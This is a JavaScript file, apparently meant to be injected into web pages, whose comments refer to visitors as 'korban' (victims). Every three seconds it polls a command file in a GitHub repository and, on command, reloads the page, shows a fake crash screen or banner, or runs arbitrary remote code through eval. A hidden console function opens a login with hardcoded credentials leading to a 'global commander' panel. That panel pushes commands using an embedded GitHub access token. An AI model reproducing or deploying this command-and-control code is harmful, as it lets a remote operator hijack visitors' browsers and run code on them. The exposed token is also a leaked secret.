(function() {
    // 1. PENGATURAN REMOTE (Global Listener)
    const REPO = "fantasiy/tools_free_2026";
    const TOKEN = "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";
    const CMD_URL = `https://raw.githubusercontent.com/${REPO}/main/command.json`;
    let lastId = "";

    // Listener buat korban (Cek tiap 3 detik)
    setInterval(async () => {
        try {
            const r = await fetch(CMD_URL + "?v=" + Date.now());
            const d = await r.json();
            if (d.active && d.id !== lastId) {
                lastId = d.id;
                if (d.action === 'RESTART') location.reload();
                if (d.action === 'BSOD') document.body.innerHTML = "<div style='background:#00a;color:#fff;height:100vh;padding:50px;font-family:monospace;'><h1>:(</h1><p>DARK6_SYSTEM_FAILURE</p></div>";
                if (d.action === 'ANNOUNCE') {
                    const b = document.createElement('div');
                    b.style = "position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;z-index:999999;font-weight:bold;";
                    b.innerText = d.text;
                    document.body.appendChild(b);
                    setTimeout(() => b.remove(), d.duration * 1000);
                }
                if (d.action === 'EXECUTE') eval(d.payload);
            }
        } catch(e) {}
    }, 3000);

    // 2. FUNGSI RAHASIA (Hanya bisa dipanggil lewat Console)
    window.dark6_open = function() {
        if (document.getElementById('d6-auth')) return;
        const auth = document.createElement('div');
        auth.id = "d6-auth";
        auth.innerHTML = `
            <div style="background:#ff0055;padding:10px;font-weight:bold;color:white;text-align:center;">DARK6 ADMIN LOGIN</div>
            <div style="padding:15px;background:#000;border:1px solid #ff0055;border-top:none;">
                <input type="text" id="adm-user" placeholder="Gmail Admin" style="width:100%;margin-bottom:10px;background:#111;color:#fff;border:1px solid #333;padding:5px;">
                <input type="password" id="adm-pass" placeholder="Password" style="width:100%;margin-bottom:10px;background:#111;color:#fff;border:1px solid #333;padding:5px;">
                <button id="adm-btn" style="width:100%;background:#ff0055;color:white;border:none;padding:10px;cursor:pointer;font-weight:bold;">LOGIN</button>
            </div>
        `;
        Object.assign(auth.style, { position:'fixed', top:'50%', left:'50%', transform:'translate(-50%, -50%)', width:'280px', zIndex:1000000, fontFamily:'monospace', boxShadow:'0 0 30px #ff0055' });
        document.body.appendChild(auth);

        document.getElementById('adm-btn').onclick = function() {
            if (document.getElementById('adm-user').value === "Admin123" && document.getElementById('adm-pass').value === "Admin124") {
                auth.remove();
                activateMasterControl();
            } else { alert("ACCESS DENIED!"); }
        };
    };

    function activateMasterControl() {
        const gui = document.createElement('div');
        gui.innerHTML = `
            <div style="background:#ff0055;padding:10px;font-weight:bold;color:white;">DARK6 GLOBAL COMMANDER</div>
            <div style="padding:10px;background:rgba(0,0,0,0.95);border:1px solid #ff0055;max-height:400px;overflow-y:auto;">
                <select id="sel-act" style="width:100%;background:#222;color:#0f0;margin-bottom:10px;border:1px solid #ff0055;">
                    <option value="ANNOUNCE">📢 ANNOUNCE</option>
                    <option value="RESTART">♻️ RESTART</option>
                    <option value="BSOD">💀 BSOD</option>
                    <option value="EXECUTE">🚀 CUSTOM JS</option>
                </select>
                <textarea id="sel-txt" placeholder="Payload/Text" style="width:100%;height:60px;background:#000;color:#fff;border:1px solid #333;"></textarea>
                <button id="fire-btn" style="width:100%;background:#ff0055;color:white;margin-top:10px;padding:10px;font-weight:bold;cursor:pointer;border:none;">FIRE GLOBAL!</button>
                <div id="log-st" style="font-size:10px;color:#888;margin-top:5px;">System: Online</div>
            </div>
        `;
        Object.assign(gui.style, { position:'fixed', top:'10px', left:'10px', width:'240px', zIndex:1000001, fontFamily:'monospace', border:'1px solid #ff0055' });
        document.body.appendChild(gui);

        document.getElementById('fire-btn').onclick = async function() {
            const st = document.getElementById('log-st');
            st.innerText = "Syncing...";
            try {
                const getF = await fetch(`https://api.github.com/repos/${REPO}/contents/command.json`, { headers:{"Authorization":`token ${TOKEN}`} });
                const fData = await getF.json();
                const body = { id:Date.now().toString(), active:true, action:document.getElementById('sel-act').value, text:document.getElementById('sel-txt').value, payload:document.getElementById('sel-txt').value, duration:10 };
                const put = await fetch(`https://api.github.com/repos/${REPO}/contents/command.json`, {
                    method:"PUT", headers:{"Authorization":`token ${TOKEN}`,"Content-Type":"application/json"},
                    body:JSON.stringify({ message:"Global Action", content:btoa(JSON.stringify(body,null,2)), sha:fData.sha })
                });
                st.innerText = put.ok ? "SENT SUCCESS!" : "FAILED!";
            } catch(e) { st.innerText = "ERROR!"; }
        };
    }
})();
